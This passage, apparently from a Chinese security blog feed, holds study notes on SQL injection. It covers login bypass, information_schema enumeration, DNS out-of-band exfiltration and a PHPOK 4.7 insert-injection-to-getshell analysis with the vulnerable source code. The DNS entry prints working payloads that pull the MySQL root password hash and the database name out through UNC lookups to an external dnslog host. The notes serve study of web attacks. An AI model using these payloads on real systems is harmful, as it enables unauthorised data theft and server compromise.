class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; order by 2#</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/n8nIF5JiU1*uydG*pNEl36opJ4RjWDONYFA.ivtECCE!/b/dL8AAAAAAAAA&amp;bo=lAS0AQAAAAADJyc!&amp;rf=viewer_4" alt><br>登陆失败，无显示,说明字段为2。</p><p>我们尝试下猜数据库版本：<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/cdMGniPDlkmYnllHrJ8gvx8RMgPKV7bG.DcxpiXeJj8!/b/dFQBAAAAAAAA&amp;bo=jwGZAAAAAAADFyU!&amp;rf=viewer_4" alt></p><p>发现不仅登陆成功，并爆出了版本号<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/49Ye2S7pk7SkFSpT1If6A2IfwjT24AjCvEEdme0Plwg!/b/dFQBAAAAAAAA&amp;bo=QgPcAAAAAAADF68!&amp;rf=viewer_4" alt></p><p>这时的sql语句如下：<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/GQZ9l8h2oJXVpEu6vbrD87kOiB1DuduyH7aVTXGPsUQ!/b/dL4AAAAAAAAA&amp;bo=LAdfAAAAAAADF0Y!&amp;rf=viewer_4" alt><br>去数据库查询了username=1，但查询不到，则联合查询了后面的语句，爆出了数据库版本5.5.53；</p><p>在爆出数据库<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/JClWQRPGxeIFbUauSoQ2SczVYuSJmlM5JW.2AyJPhNY!/b/dLgAAAAAAAAA&amp;bo=RQfGAQAAAAADB6c!&amp;rf=viewer_4" alt></p><p>再通过系统库爆出表，字段，来进一步进行注入！</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入原理分析</title>
      <link href="/2019/12/07/sql1/"/>
      <url>/2019/12/07/sql1/</url>
      
        <content type="html"><![CDATA[<h2 id="sql-injection介绍："><a href="#sql-injection介绍：" class="headerlink" title="sql injection介绍："></a>sql injection介绍：</h2><hr><p>我们称之为 sql 注入。何为 sql，英文：Structured Query Language，<br>叫做结构化查询语言。常见的结构化数据库有 MySQL，MS SQL ,Oracle 以及 Postgresql。Sql<br>语言就是我们在管理数据库时用到的一种。在我们的应用系统使用 sql 语句进行管理应用数<br>据库时，往往<code>采用拼接的方式形成一条完整的数据库语言，而危险的是，在拼接 sql 语句的<br>时候，我们可以改变 sql 语句。从而让数据执行我们想要执行的语句</code>，这就是我们常说的sql注入。</p><h2 id="sql注入原理："><a href="#sql注入原理：" class="headerlink" title="sql注入原理："></a>sql注入原理：</h2><hr><p><strong>sql注入攻击的原理</strong></p><p>就是将用户输出的数据当成代码然后被服务器放到数据库上去执行了。</p><p><strong>sql注入实现的两大条件</strong></p><p>1.用户能够控制输出.</p><p>2.原本程序要执行的代码，拼接了用户输入的数据</p><p><strong>SQL注入攻击的典型手段</strong></p><ol><li>判断应用程序是否存在注入漏洞</li><li>收集信息、并判断数据库类型</li><li>根据注入参数类型，重构SQL语句的原貌</li><li>猜解表名、字段名</li><li>获取账户信息、攻击web或为下一步攻击做准备</li></ol><p><strong>information_schema库</strong></p><p>information_schema库是php5.0以后自动生成的系统库，通常我们可以通过系统库查询到很多信息，比如information_schema库里面的tables表中就放着所有的表名，information_schema库里面的columns表放着所有列名。而数据库我们可以通过database()函数爆出也可以通过系统库的schemata库去查询。我们知道以上信息，就可以通过sql语句一步步爆出数据库隐密信息！</p><p><strong>一般的流程为：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select schema_name from information_schema.schemata</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&quot;数据库名&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_name=&quot;表名&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 字段名 from 表</span><br></pre></td></tr></table></figure><p><strong><em>SQL注入是怎么产生的？</em></strong></p><ol><li><p>WEB开发人员无法保证所有的输入都已经过滤</p></li><li><p>攻击者利用发送给SQL服务器的输入参数构造可执行的SQL代码（可加入到get请求、post请求、http头信息、cookie中）</p></li><li><p>数据库未做相应的安全配置</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql-dns注入</title>
      <link href="/2019/12/07/sql-dnslog/"/>
      <url>/2019/12/07/sql-dnslog/</url>
      
        <content type="html"><![CDATA[<h2 id="dns注入的使用场景："><a href="#dns注入的使用场景：" class="headerlink" title="dns注入的使用场景："></a>dns注入的使用场景：</h2><p>在某些无法直接利用注入漏洞获得回显的情况下，但目标还是可以发起dns请求，这个时候我们就可以通过dns解析把获得的数据外带出去。</p><p>对于sql盲注通常是使用二分法去一步步猜，但是此方法繁琐不说，而且因为不断向服务器发送数据请求，而导致被ban，所以我们可以通过select<br>到的数据发送到一个url上，利用dns解析产生的记录日志来查看数据；</p><h2 id="dns使用函数解析："><a href="#dns使用函数解析：" class="headerlink" title="dns使用函数解析："></a>dns使用函数解析：</h2><ul><li><strong>load_file:</strong></li></ul><p>这是一个用来读取文件的函数（必须是root权限），读取文件并返回文件内容为字符串。要使用此函数，文件<strong>必须位于服务器主机上</strong>，必须<strong>指定完整路径的文件</strong>，而且<strong>必须有FILE权限</strong>。 该文件所有字节可读，但文件内容必须小于max_allowed_packetx(限制server接收数据包大小函数，默认是1MB)。<br>如果<strong>该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。</strong><br>在MySQL5.0.19，character_set_filesystem系统变量控制文件名的解释，即仅作文字字符串。</p><hr><p><a href="http://ceye.io是一个免费的dnslog平台，（里面提供了如何操作和注入paylod）" target="_blank" rel="noopener">http://ceye.io是一个免费的dnslog平台，（里面提供了如何操作和注入paylod）</a></p><p>平台所给出的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(&apos;\\\\&apos;,(SELECT password FROM mysql.user WHERE user=&apos;root&apos; LIMIT 1),&apos;.yluzfg.ceye.io\\abc&apos;));</span><br></pre></td></tr></table></figure></p><p>执行之后:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;\\root.yluzfg.ceye.io\abc&apos;)</span><br></pre></td></tr></table></figure><p>concat其实我们已经了解过了，通过他来拼接字符串。<br>而前面的\将后面的\转义了，所以只剩下两个’\’</p><p>而\开头加上网络路径正好形成了一个unc路径，这种也叫UNC路径访问法<br>通过命令去访问网上邻居。</p><p>实际上这句语句是数据库执行去访问root.yluzfg.ceye.io的共享文件夹abc，而ceye.io的子域名解析都是在某些服务器，然后记录了有人请求访问了root.yluzfg.ceye.io，然后通过日志在ceye这个平台上面显示出来了。</p><p>我们可以通过构造payloads来通过dns解析产生的记录日志并传到yece.io查询我们需要的信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and (select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.xxxxx.ceye.io\\abc&apos;)))#</span><br></pre></td></tr></table></figure><p>在通过ceye去查看我们所爆出的信息；<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/jP2FMP6IcA.s0t78L8v1AAEErEAqFFyX3mGTVvy9g8Y!/b/dL4AAAAAAAAA&amp;bo=lAOBAAAAAAADBzQ!&amp;rf=viewer_4" alt></p><p>就这样，通过一步步爆出数据库、表、字段等关键信息，对于有多个值，我们也可以通过移动偏移去一个个查看；</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHPOK 4.7从注入到getshell</title>
      <link href="/2019/12/07/PHPOK%204.7%E4%BB%8E%E6%B3%A8%E5%85%A5%E5%88%B0getshell/"/>
      <url>/2019/12/07/PHPOK%204.7%E4%BB%8E%E6%B3%A8%E5%85%A5%E5%88%B0getshell/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>phpok是一款PHP开发的开源企业网站系统。<br>在phpok 4.7版本及以前，存在一个由注入导致的前台getshell漏洞。<br>目前官方最新版已经修补。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在/framework/www/upload_control.php中第61行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">private function upload_base($input_name=&apos;upfile&apos;,$cateid=0)</span><br><span class="line">    &#123;</span><br><span class="line">        $rs = $this-&gt;lib(&apos;upload&apos;)-&gt;getfile($input_name,$cateid);</span><br><span class="line">        if($rs[&quot;status&quot;] != &quot;ok&quot;)&#123;</span><br><span class="line">            return $rs;</span><br><span class="line">        &#125;</span><br><span class="line">        $array = array();</span><br><span class="line">        $array[&quot;cate_id&quot;] = $rs[&apos;cate&apos;][&apos;id&apos;];</span><br><span class="line">        $array[&quot;folder&quot;] = $rs[&apos;folder&apos;];</span><br><span class="line">        $array[&quot;name&quot;] = basename($rs[&apos;filename&apos;]);</span><br><span class="line">        $array[&quot;ext&quot;] = $rs[&apos;ext&apos;];</span><br><span class="line">        $array[&quot;filename&quot;] = $rs[&apos;filename&apos;];</span><br><span class="line">        $array[&quot;addtime&quot;] = $this-&gt;time;</span><br><span class="line">        $array[&quot;title&quot;] = $rs[&apos;title&apos;];</span><br><span class="line">        $array[&apos;session_id&apos;] = $this-&gt;session-&gt;sessid();</span><br><span class="line">        $array[&apos;user_id&apos;] = $this-&gt;session-&gt;val(&apos;user_id&apos;);</span><br><span class="line">        $arraylist = array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;);</span><br><span class="line">        if(in_array($rs[&quot;ext&quot;],$arraylist))&#123;</span><br><span class="line">            $img_ext = getimagesize($this-&gt;dir_root.$rs[&apos;filename&apos;]);</span><br><span class="line">            $my_ext = array(&quot;width&quot;=&gt;$img_ext[0],&quot;height&quot;=&gt;$img_ext[1]);</span><br><span class="line">            $array[&quot;attr&quot;] = serialize($my_ext);</span><br><span class="line">        &#125;</span><br><span class="line">        $id = $this-&gt;model(&apos;res&apos;)-&gt;save($array);</span><br><span class="line">        if(!$id)&#123;</span><br><span class="line">            $this-&gt;lib(&apos;file&apos;)-&gt;rm($this-&gt;dir_root.$rs[&apos;filename&apos;]);</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;图片存储失败&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;model(&apos;res&apos;)-&gt;gd_update($id);</span><br><span class="line">        $rs = $this-&gt;model(&apos;res&apos;)-&gt;get_one($id);</span><br><span class="line">        $rs[&quot;status&quot;] = &quot;ok&quot;;</span><br><span class="line">        return $rs;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这是一个文件上传函数，然后在该函数开头又调用了getfile函数，跟进:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public function getfile($input=&apos;upfile&apos;,$cateid=0)</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$input)&#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;content&apos;=&gt;P_Lang(&apos;未指定表单名称&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;_cate($cateid);</span><br><span class="line">        if(isset($_FILES[$input]))&#123;</span><br><span class="line">            $rs = $this-&gt;_upload($input);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $rs = $this-&gt;_save($input);</span><br><span class="line">        &#125;</span><br><span class="line">        if($rs[&apos;status&apos;] != &apos;ok&apos;)&#123;</span><br><span class="line">            return $rs;</span><br><span class="line">        &#125;</span><br><span class="line">        $rs[&apos;cate&apos;] = $this-&gt;cate;</span><br><span class="line">        return $rs;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果存在上传文件就调用_upload函数，继续跟进:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">private function _upload($input)</span><br><span class="line">    &#123;</span><br><span class="line">        global $app;</span><br><span class="line">        $basename = substr(md5(time().uniqid()),9,16);</span><br><span class="line">        $chunk = $app-&gt;get(&apos;chunk&apos;,&apos;int&apos;);</span><br><span class="line">        $chunks = $app-&gt;get(&apos;chunks&apos;,&apos;int&apos;);</span><br><span class="line">        if(!$chunks)&#123;</span><br><span class="line">            $chunks = 1;</span><br><span class="line">        &#125;</span><br><span class="line">        $tmpname = $_FILES[$input][&quot;name&quot;];</span><br><span class="line">        $tmpid = &apos;u_&apos;.md5($tmpname);</span><br><span class="line">        $ext = $this-&gt;file_ext($tmpname);</span><br><span class="line">        $out_tmpfile = $this-&gt;dir_root.&apos;data/cache/&apos;.$tmpid.&apos;_&apos;.$chunk;</span><br><span class="line">        if (!$out = @fopen($out_tmpfile.&quot;.parttmp&quot;, &quot;wb&quot;)) &#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;无法打开输出流&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $error_id = $_FILES[$input][&apos;error&apos;] ? $_FILES[$input][&apos;error&apos;] : 0;</span><br><span class="line">        if($error_id)&#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;$this-&gt;up_error[$error_id]);</span><br><span class="line">        &#125;</span><br><span class="line">        if(!is_uploaded_file($_FILES[$input][&apos;tmp_name&apos;]))&#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;上传失败，临时文件无法写入&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        if(!$in = @fopen($_FILES[$input][&quot;tmp_name&quot;], &quot;rb&quot;)) &#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;无法打开输入流&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        while ($buff = fread($in, 4096)) &#123;</span><br><span class="line">            fwrite($out, $buff);</span><br><span class="line">        &#125;</span><br><span class="line">        @fclose($out);</span><br><span class="line">        @fclose($in);</span><br><span class="line">        $app-&gt;lib(&apos;file&apos;)-&gt;mv($out_tmpfile.&apos;.parttmp&apos;,$out_tmpfile.&apos;.part&apos;);</span><br><span class="line">        $index = 0;</span><br><span class="line">        $done = true;</span><br><span class="line">        for($index=0;$index&lt;$chunks;$index++) &#123;</span><br><span class="line">            if (!file_exists($this-&gt;dir_root.&apos;data/cache/&apos;.$tmpid.&apos;_&apos;.$index.&quot;.part&quot;) ) &#123;</span><br><span class="line">                $done = false;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if(!$done)&#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;&apos;上传的文件异常&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">        $outfile = $this-&gt;folder.$basename.&apos;.&apos;.$ext;</span><br><span class="line">        if(!$out = @fopen($this-&gt;dir_root.$outfile,&quot;wb&quot;)) &#123;</span><br><span class="line">            return array(&apos;status&apos;=&gt;&apos;error&apos;,&apos;error&apos;=&gt;P_Lang(&apos;无法打开输出流&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        if(flock($out,LOCK_EX))&#123;</span><br><span class="line">            for($index=0;$index&lt;$chunks;$index++) &#123;</span><br><span class="line">                if (!$in = @fopen($this-&gt;dir_root.&apos;data/cache/&apos;.$tmpid.&apos;_&apos;.$index.&apos;.part&apos;,&apos;rb&apos;))&#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                while ($buff = fread($in, 4096)) &#123;</span><br><span class="line">                    fwrite($out, $buff);</span><br><span class="line">                &#125;</span><br><span class="line">                @fclose($in);</span><br><span class="line">                $GLOBALS[&apos;app&apos;]-&gt;lib(&apos;file&apos;)-&gt;rm($this-&gt;dir_root.&apos;data/cache/&apos;.$tmpid.&quot;_&quot;.$index.&quot;.part&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            flock($out,LOCK_UN);</span><br><span class="line">        &#125;</span><br><span class="line">        @fclose($out);</span><br><span class="line">        $tmpname = $GLOBALS[&apos;app&apos;]-&gt;lib(&apos;string&apos;)-&gt;to_utf8($tmpname);</span><br><span class="line">        $title = str_replace(&quot;.&quot;.$ext,&apos;&apos;,$tmpname);</span><br><span class="line">        return array(&apos;title&apos;=&gt;$title,&apos;ext&apos;=&gt;$ext,&apos;filename&apos;=&gt;$outfile,&apos;folder&apos;=&gt;$this-&gt;folder,&apos;status&apos;=&gt;&apos;ok&apos;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其中<strong>$ext = $this-&gt;file_ext($tmpname);</strong>是检测文件后缀的，看一下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">private function file_ext($tmpname)</span><br><span class="line">    &#123;</span><br><span class="line">        $ext = pathinfo($tmpname,PATHINFO_EXTENSION);</span><br><span class="line">        if(!$ext)&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $ext = strtolower($ext);</span><br><span class="line">        $filetypes = &quot;jpg,gif,png&quot;;</span><br><span class="line">        if($this-&gt;cate &amp;&amp; $this-&gt;cate[&apos;filetypes&apos;])&#123;</span><br><span class="line">            $filetypes .= &quot;,&quot;.$this-&gt;cate[&apos;filetypes&apos;];</span><br><span class="line">        &#125;</span><br><span class="line">        if($this-&gt;file_type)&#123;</span><br><span class="line">            $filetypes .= &quot;,&quot;.$this-&gt;file_type;</span><br><span class="line">        &#125;</span><br><span class="line">        $list = explode(&quot;,&quot;,$filetypes);</span><br><span class="line">        $list = array_unique($list);</span><br><span class="line">        if(!in_array($ext,$list))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return $ext;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>上传是比较严格的，只允许上传后缀是jpg,png,gif这种图片后缀的文件，上传我们无法绕过，但是程序对于上传的文件名没有充份的过滤，在函数末尾，将文件名添加到了返回的数组中:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$tmpname = $GLOBALS[&apos;app&apos;]-&gt;lib(&apos;string&apos;)-&gt;to_utf8($tmpname);</span><br><span class="line">        $title = str_replace(&quot;.&quot;.$ext,&apos;&apos;,$tmpname);</span><br><span class="line">        return array(&apos;title&apos;=&gt;$title,&apos;ext&apos;=&gt;$ext,&apos;filename&apos;=&gt;$outfile,&apos;folder&apos;=&gt;$this-&gt;folder,&apos;status&apos;=&gt;&apos;ok&apos;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里的$tmpname就是我们上传的文件名，注意，不是上传后的文件名，而是上传前的文件名，并且没有对该文件名过滤，然后返回。</p><p>我们回到开头，upload_base函数中去:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$rs = $this-&gt;lib(&apos;upload&apos;)-&gt;getfile($input_name,$cateid);</span><br><span class="line">        if($rs[&quot;status&quot;] != &quot;ok&quot;)&#123;</span><br><span class="line">            return $rs;</span><br><span class="line">        &#125;</span><br><span class="line">        $array = array();</span><br><span class="line">        $array[&quot;cate_id&quot;] = $rs[&apos;cate&apos;][&apos;id&apos;];</span><br><span class="line">        $array[&quot;folder&quot;] = $rs[&apos;folder&apos;];</span><br><span class="line">        $array[&quot;name&quot;] = basename($rs[&apos;filename&apos;]);</span><br><span class="line">        $array[&quot;ext&quot;] = $rs[&apos;ext&apos;];</span><br><span class="line">        $array[&quot;filename&quot;] = $rs[&apos;filename&apos;];</span><br><span class="line">        $array[&quot;addtime&quot;] = $this-&gt;time;</span><br><span class="line">        $array[&quot;title&quot;] = $rs[&apos;title&apos;];</span><br><span class="line">        $array[&apos;session_id&apos;] = $this-&gt;session-&gt;sessid();</span><br><span class="line">        $array[&apos;user_id&apos;] = $this-&gt;session-&gt;val(&apos;user_id&apos;);</span><br><span class="line">        $arraylist = array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;);</span><br><span class="line">        if(in_array($rs[&quot;ext&quot;],$arraylist))&#123;</span><br><span class="line">            $img_ext = getimagesize($this-&gt;dir_root.$rs[&apos;filename&apos;]);</span><br><span class="line">            $my_ext = array(&quot;width&quot;=&gt;$img_ext[0],&quot;height&quot;=&gt;$img_ext[1]);</span><br><span class="line">            $array[&quot;attr&quot;] = serialize($my_ext);</span><br><span class="line">        &#125;</span><br><span class="line">        $id = $this-&gt;model(&apos;res&apos;)-&gt;save($array);</span><br></pre></td></tr></table></figure><p>可以看到这里将返回值中的title的值赋值给了$array[‘title’],这个值是我们可控的，然后将$array带入到了save函数中，我们看一下该函数:</p><p>在/framework/model/res.php中第279行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public function save($data,$id=0)</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$data || !is_array($data))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if($id)&#123;</span><br><span class="line">            return $this-&gt;db-&gt;update_array($data,&quot;res&quot;,array(&quot;id&quot;=&gt;$id));</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return $this-&gt;db-&gt;insert_array($data,&quot;res&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>将$data带入到了insert_array函数中，我们看一下该函数:</p><p>/framework/engine/db/mysqli.php中第211行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public function insert_array($data,$tbl,$type=&quot;insert&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$tbl || !$data || !is_array($data))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if(substr($tbl,0,strlen($this-&gt;prefix)) != $this-&gt;prefix)&#123;</span><br><span class="line">            $tbl = $this-&gt;prefix.$tbl;</span><br><span class="line">        &#125;</span><br><span class="line">        $type = strtolower($type);</span><br><span class="line">        $sql = $type == &apos;insert&apos; ? &quot;INSERT&quot; : &quot;REPLACE&quot;;</span><br><span class="line">        $sql.= &quot; INTO &quot;.$tbl.&quot; &quot;;</span><br><span class="line">        $sql_fields = array();</span><br><span class="line">        $sql_val = array();</span><br><span class="line">        foreach($data AS $key=&gt;$value)&#123;</span><br><span class="line">            $sql_fields[] = &quot;`&quot;.$key.&quot;`&quot;;</span><br><span class="line">            $sql_val[] = &quot;&apos;&quot;.$value.&quot;&apos;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        $sql.= &quot;(&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;;</span><br><span class="line">        return $this-&gt;insert($sql);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>就是将该数组中的键值遍历出来，将键作为字段名，将值作为对应字段的值。可以看到，对于值是没有进行转义的，其中包括我们可以控制的title的值，那么这里就产生了一个insert的注入。那么这个注入我们有什么用呢？当然首先想到的是一个出数据，但是对于update 或者insert注入，一般来说我会想办法将这个注入升级一下危害。注意这个注入是一个insert注入，并且insert语句是可以一次插入多条内容的，我们不能控制当前这条insert语句的内容，我们可以控制下一条的内容，比如说像这样:<br>Insert into file values(1,2,3,),(4,5,6)<br>那么我们控制下一条的内容有什么用，好，现在我们开始看/framework/www/upload_control.php中的第103行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">public function replace_f()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;popedom();</span><br><span class="line">        $id = $this-&gt;get(&quot;oldid&quot;,&apos;int&apos;);</span><br><span class="line">        if(!$id)&#123;</span><br><span class="line">            